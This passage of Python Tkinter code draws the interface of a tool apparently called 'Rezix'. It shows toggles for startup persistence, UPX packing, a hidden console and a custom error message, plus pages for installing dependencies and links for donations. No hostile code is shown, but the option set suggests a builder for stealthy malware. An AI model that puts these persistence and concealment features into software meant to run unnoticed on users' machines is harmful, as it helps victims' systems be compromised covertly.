            self.addstartupb = Button(window, image=blankbu,bg='#242424',borderwidth=0, activebackground="#242424",command=self.addstartuplol)
            self.addstartupb.place(x=694,y=156)
        else:
            self.addstartupb = Button(window, image=fullbu,bg='#242424',borderwidth=0, activebackground="#242424",command=self.addstartuplol)
            self.addstartupb.place(x=694,y=156)
        if self.upxcomp== False:
            self.upxcompbu = Button(window, image=blankbu,bg='#242424',borderwidth=0, activebackground="#242424",command=self.upxcomplol)
            self.upxcompbu.place(x=694,y=192)
        else:
            self.upxcompbu = Button(window, image=fullbu,bg='#242424',borderwidth=0, activebackground="#242424",command=self.upxcomplol)
            self.upxcompbu.place(x=694,y=192)

        if self.noconsole== False:
            self.noconsoleb = Button(window, image=blankbu,bg='#242424',borderwidth=0, activebackground="#242424",command=self.noconsolelol)
            self.noconsoleb.place(x=390,y=280)
        else:
            self.noconsoleb = Button(window, image=fullbu,bg='#242424',borderwidth=0, activebackground="#242424",command=self.noconsolelol)
            self.noconsoleb.place(x=390,y=280)
        if self.errormsg== False:
            self.errormsgb = Button(window, image=blankbu,bg='#242424',borderwidth=0, activebackground="#242424",command=self.errormsglol)
            self.errormsgb.place(x=390,y=327)
        else:
            self.errormsgb = Button(window, image=fullbu,bg='#242424',borderwidth=0, activebackground="#242424",command=self.errormsglol)
            self.errormsgb.place(x=390,y=327)
        self.errormsge = Entry(window,text='d',font=('SeoulHangang',10),bg='#989898', fg='#474747',width=16,borderwidth=0)
        self.errormsge.place(x=306,y=375)
    def settings(self):
        bgg = Label(window, image=bg3, borderwidth=0)
        bgg.place(x=166, y=0)
        self.gotosetup = Button(window, image=setupbu,bg='#474747',borderwidth=0, activebackground="#474747",command=self.setup)
        self.gotosetup.place(x=-3,y=178)
        self.gotosettings = Button(window, image=settingbu,bg='#474747',borderwidth=0, activebackground="#474747",command=self.settings)
        self.gotosettings.place(x=-3,y=238)
        self.gotoabout = Button(window, image=aboutbu,bg='#474747',borderwidth=0, activebackground="#474747",command=self.about)
        self.gotoabout.place(x=-3,y=298)
        self.gotosettings = Button(window, image=settingbu2,bg='#474747',borderwidth=0, activebackground="#474747",command=self.settings)
        self.gotosettings.place(x=-3,y=238)
        #
        installreq = Button(window, image=installbu,bg='#242424',borderwidth=0, activebackground="#242424",command=self.installrequirements)
        installreq.place(x=454,y=133)
        installpy = Button(window, image=installbu,bg='#242424',borderwidth=0, activebackground="#242424",command=self.installpython)
        installpy.place(x=454,y=187)
        checkpyver = Button(window, image=checkbu,bg='#242424',borderwidth=0, activebackground="#242424",command=self.checkversion)
        checkpyver.place(x=454,y=275)
    def about(self):
        bgg = Label(window, image=bg4, borderwidth=0)
        bgg.place(x=166, y=0)
        self.gotosetup = Button(window, image=setupbu,bg='#474747',borderwidth=0, activebackground="#474747",command=self.setup)
        self.gotosetup.place(x=-3,y=178)
        self.gotosettings = Button(window, image=settingbu,bg='#474747',borderwidth=0, activebackground="#474747",command=self.settings)
        self.gotosettings.place(x=-3,y=238)
        self.gotoabout = Button(window, image=aboutbu,bg='#474747',borderwidth=0, activebackground="#474747",command=self.about)
        self.gotoabout.place(x=-3,y=298)
        self.gotoabout = Button(window, image=aboutbu2,bg='#474747',borderwidth=0, activebackground="#474747",command=self.about)
        self.gotoabout.place(x=-3,y=298)
        #
        ytblol = Button(window, image=ytb,bg='#242424',borderwidth=0, activebackground="#242424",command=self.youtube)
        ytblol.place(x=216,y=340)
        discolol = Button(window, image=disco,bg='#242424',borderwidth=0, activebackground="#242424",command=self.discord)
        discolol.place(x=282,y=342)
        paypalol = Button(window, image=paypa,bg='#242424',borderwidth=0, activebackground="#242424",command=self.paypal)
        paypalol.place(x=352,y=340)

Rezix()
window.mainloop()